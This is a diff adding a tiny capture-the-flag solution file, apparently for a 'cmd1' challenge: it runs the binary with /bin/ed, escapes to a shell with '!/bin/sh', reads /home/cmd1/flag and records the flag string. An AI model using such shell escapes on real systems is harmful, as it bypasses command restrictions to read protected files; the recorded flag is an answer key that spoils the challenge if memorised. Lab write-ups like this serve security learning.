@@ -1,0 +1,7 @@
+SOLUTION:
+	./cmd1 /bin/ed
+	!/bin/sh
+	/bin/cat /home/cmd1/flag
+FLAG:
+mommy now I get what PATH environment is for :)
+
